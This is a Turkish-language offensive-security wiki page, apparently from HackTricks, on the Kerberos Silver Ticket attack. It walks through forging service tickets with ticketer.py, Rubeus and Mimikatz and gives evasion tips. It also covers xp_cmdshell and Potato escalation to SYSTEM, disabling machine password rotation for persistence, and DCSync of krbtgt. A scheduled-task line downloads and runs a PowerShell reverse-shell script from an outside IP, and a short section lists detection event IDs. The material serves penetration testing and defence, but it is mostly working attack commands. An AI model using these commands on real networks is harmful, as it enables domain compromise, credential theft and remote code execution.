# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

**Silver Ticket** saldırısı, Active Directory (AD) ortamlarındaki service ticket'ların istismar edilmesini içerir. Bu yöntem, bir Ticket Granting Service (TGS) ticket'ı oluşturmak için bilgisayar hesabı gibi bir service account'un **NTLM hash'inin ele geçirilmesine** dayanır. Saldırgan, bu sahte ticket'ı kullanarak ağdaki belirli servislere **herhangi bir kullanıcı gibi kimlik doğrulaması yaparak** erişebilir ve genellikle yönetici ayrıcalıklarını hedefler. Ticket oluştururken AES key'leri kullanmanın daha güvenli ve tespit edilmesi daha zor olduğu vurgulanır.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Silver Ticket'ların tespit edilmesi Golden Ticket'lardan daha zordur; çünkü yalnızca krbtgt hesabının değil, **service account'un hash'inin** ele geçirilmesini gerektirir. Ancak hedefledikleri belirli servisle sınırlıdır. Ayrıca, yalnızca bir kullanıcının parolasını çalmak.
Ayrıca, **SPN'si olan bir hesabın parolasını** ele geçirirseniz, bu parolayı kullanarak o serviste herhangi bir kullanıcıyı taklit eden bir Silver Ticket oluşturabilirsiniz.

### Modern Kerberos değişiklikleri (yalnızca AES kullanan domain'ler)

- **8 Kasım 2022'de (KB5021131)** başlayan Windows güncellemeleri, mümkün olduğunda service ticket'larda varsayılan olarak **AES session key'leri** kullanıyor ve RC4'ü aşamalı olarak devre dışı bırakıyor. DC'lerde RC4'ün **2026 ortasına kadar varsayılan olarak devre dışı** bırakılması bekleniyor; bu nedenle silver ticket'lar için NTLM/RC4 hash'lerine güvenmek giderek daha sık `KRB_AP_ERR_MODIFIED` hatasına yol açıyor. Hedef service account'un **AES key'lerini** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) mutlaka çıkarın.<sup>[[5]](#references)</sup>
- Service account'un `msDS-SupportedEncryptionTypes` değeri yalnızca AES'i destekleyecek şekilde kısıtlanmışsa, `/aes256` veya `-aesKey` ile ticket oluşturmanız gerekir; NTLM hash'ine sahip olsanız bile RC4 (`/rc4` veya `-nthash`) çalışmaz.<sup>[[6]](#references)</sup>
- gMSA/bilgisayar hesaplarının parolaları her 30 günde bir değiştirilir; ticket oluşturmadan önce LSASS, Secretsdump/NTDS veya DCsync üzerinden **geçerli AES key'ini** çıkarın.
- OPSEC: araçlardaki varsayılan ticket ömrü genellikle **10 yıldır**; anormal süreler nedeniyle tespit edilmemek için gerçekçi süreler belirleyin (ör. `-duration 600` dakika).<sup>[[6]](#references)</sup>

Ticket oluşturmak için işletim sistemine göre farklı araçlar kullanılır:

### Linux'ta

```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```

### Windows'ta

```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
  /domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```

CIFS hizmeti, kurbanın dosya sistemine erişmek için yaygın bir hedef olarak öne çıkar; ancak HOST ve RPCSS gibi diğer hizmetler de görevler ve WMI sorguları için istismar edilebilir.

### Örnek: MSSQL service (MSSQLSvc) + Potato ile SYSTEM

Hesabın NTLM hash’ine (veya AES key’ine) sahipseniz ve bu hesap **kayıtlı, tam bir SQL service SPN’sinin sahibiyse**, sahte bir service ticket bu hizmet tarafından kabul edilebilir. Ticket’taki service class ve hostname, gerçek SPN ile eşleşmelidir; her kurulumun `MSSQLSvc/` kullandığını varsaymayın. İddia edilen kimlik, `xp_cmdshell`’i etkinleştirmek ve çalıştırmak için gereken izinlere sahip bir SQL login’ine de eşlenmelidir. Başarılı `xp_cmdshell` komutları, SQL service process identity (veya sysadmin olmayan çağıranlar için yapılandırılmış bir proxy) altında çalışır. Ayrı bir Potato yolunu değerlendirmeden önce bu **process token**’da `SeImpersonatePrivilege`’ın etkin olup olmadığını kontrol edin; yalnızca service configuration veya SPN bunun kanıtı değildir.<sup>[[4]](#references)</sup>

```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
  -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```

- Elde edilen context'te SeImpersonatePrivilege varsa (servis hesaplarında genellikle bulunur), SYSTEM elde etmek için bir Potato varyantı kullanın:

```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```

MSSQL'yi kötüye kullanma ve xp_cmdshell'i etkinleştirme hakkında daha fazla ayrıntı:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato tekniklerine genel bakış:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Kullanılabilir Hizmetler

| Hizmet Türü                               | Hizmet Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>İşletim sistemine bağlı olarak ayrıca:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Bazı durumlarda yalnızca şunu isteyebilirsiniz: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, psexec dahil           | CIFS                                                                       |
| LDAP işlemleri, DCSync dahil               | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

**Rubeus** kullanarak aşağıdaki parametreyle bu ticket'ların **tümünü isteyebilirsiniz**:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Olay Kimlikleri

- 4624: Hesap Oturumu Açma
- 4634: Hesap Oturumu Kapatma
- 4672: Yönetici Oturumu Açma
- Aynı istemci/hizmet için DC'de öncesinde 4768/4769 kaydının **bulunmaması**, doğrudan hizmete sunulan sahte bir TGS'nin yaygın bir göstergesidir.
- Olağandışı uzun ticket ömrü veya beklenmeyen şifreleme türü (etki alanı AES'i zorunlu tutarken RC4 kullanılması) da 4769/4624 verilerinde dikkat çeker.

## Persistence

Makinelerin parolalarını her 30 günde bir değiştirmesini önlemek için `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ayarını yapın veya makinelerin parolasının ne zaman değiştirileceğini belirten rotasyon süresini belirtmek için `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` değerini 30 günden daha büyük bir değere ayarlayın.<sup>[[3]](#references)</sup>

## Service ticket'ları kötüye kullanma

Aşağıdaki örneklerde ticket'ın yönetici hesabını taklit ederek alındığını varsayalım.

### CIFS

Bu ticket ile **SMB** üzerinden `C$` ve `ADMIN$` klasörlerine (paylaşıma açılmışlarsa) erişebilir ve aşağıdakine benzer bir işlem yaparak dosyaları uzak dosya sisteminin bir bölümüne kopyalayabilirsiniz:

```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```

Ayrıca host içinde bir shell elde edebilir veya **psexec** kullanarak rastgele komutlar çalıştırabilirsiniz:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Bu izinle uzak bilgisayarlarda zamanlanmış görevler oluşturabilir ve rastgele komutlar çalıştırabilirsiniz:

```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```

### HOST + RPCSS

Bu ticket'larla **kurban sisteminde WMI çalıştırabilirsiniz**:

```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```

**wmiexec hakkında daha fazla bilgiye** aşağıdaki sayfadan ulaşabilirsiniz:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Bir bilgisayara winrm erişiminiz varsa **ona erişebilir** ve hatta bir PowerShell alabilirsiniz:

```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```

winrm kullanarak uzak bir ana makineye bağlanmanın **daha fazla yolunu** öğrenmek için aşağıdaki sayfaya göz atın:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Uzak bilgisayara erişmek için **winrm etkin olmalı ve bağlantı kabul ediyor olmalıdır**.

### LDAP

Bu yetkiyle **DCSync** kullanarak DC veritabanını dump edebilirsiniz:

```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```

**DCSync hakkında daha fazla bilgi edinin**:


{{#ref}}
dcsync.md
{{#endref}}


## References

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): Kerberos'a nasıl saldırılır? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Machine Account Password Process - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: Silver Ticket + Potato yolu](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131 Kerberos hardening ve RC4 kullanımdan kaldırma](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Impacket ticketer.py güncel seçenekleri (AES/keytab/süre)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)
{{#include ../../banners/hacktricks-training.md}}
